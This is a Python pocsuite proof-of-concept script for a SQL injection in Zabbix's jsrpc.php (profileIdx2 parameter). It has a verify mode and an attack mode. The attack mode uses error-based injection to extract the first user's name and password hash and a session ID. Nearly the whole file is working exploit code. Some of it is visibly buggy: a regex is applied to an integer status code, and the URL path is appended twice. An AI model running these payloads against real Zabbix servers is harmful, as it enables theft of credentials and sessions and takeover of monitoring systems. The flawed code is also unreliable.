#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

import urlparse,urllib2,re

class ZabbixPOC(POCBase):
    vulID = '9'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2017-03-22' #漏洞公开的时间,不知道就写今天

    author = 'ly55521' #  PoC作者的大名
    createDate = '2017-03-22'# 编写 PoC 的日期
    updateDate = '2017-03-22'# PoC 更新的时间,默认和编写时间一样
    references = 'https://www.waitalone.cn/zabbix-sql-1.html'# 漏洞地址来源,0day不用写
    name = 'Zabbix SQL Injection'# PoC 名称
    appPowerLink = 'http://www.zabbix.com'# 漏洞厂商主页地址
    appName = 'Zabbix'# 漏洞应用名称
    appVersion = '2.2.x, 3.0.0-3.0.3'# 漏洞影响版本
    vulType = 'sql-inj'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Zabbix SQL注入漏洞
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危" #严重,高危,中危,低危
    vul_url = ''


    #验证漏洞 pocsuite -r 9-zabbix-sqlInjection.py -u 10.1.5.26 --verify
    def _verify(self):
        #定义返回结果  
        result = {}
        #获取漏洞url
        Payload = "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999'&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
        host = urlparse.urlparse(self.url).scheme + "://" + urlparse.urlparse(self.url).netloc
        self.vul_url = str( host + Payload)
        #print self.vul_url
        try:
            r = req.get(url=self.vul_url,allow_redirects=False,timeout=10).status_code #禁止重定向
            key_reg = re.compile(r"INSERT\s*INTO\s*profiles")
            #print r,key_reg
            if  key_reg.findall(r):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.vul_url
                result['VerifyInfo']['Payload'] = Payload
            else:
                pass
        except Exception, e:
            pass
        print '[+]9 poc done'
        return self.save_output(result)

    #攻击漏洞 pocsuite -r 9-zabbix-sqlInjection.py -u 10.1.5.26 --attack
    def _attack(self):
        result = {}
        # 攻击代码
        passwd_sql = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
        session_sql = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
        pwd = u"passwd:" + self.sql_Inject(passwd_sql)
        session = u"--session:" + self.sql_Inject(session_sql)
        Payload = pwd + session
        #print self.vul_url,Payload
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.vul_url
        result['VerifyInfo']['Payload'] = Payload
        return self.save_output(result)

    #SQL注入攻击函数
    def sql_Inject(self,sql):
        #u'获取特定sql语句内容'
        payload = self.vul_url + "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=" + urllib2.quote(
            sql) + "&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
        #print payload
        try:
            response = urllib2.urlopen(payload, timeout=10).read()
        except Exception, msg:
            #print msg
            pass
        else:
            result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
            results = result_reg.findall(response)
            if results:
                return str(results[0])

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(ZabbixPOC)

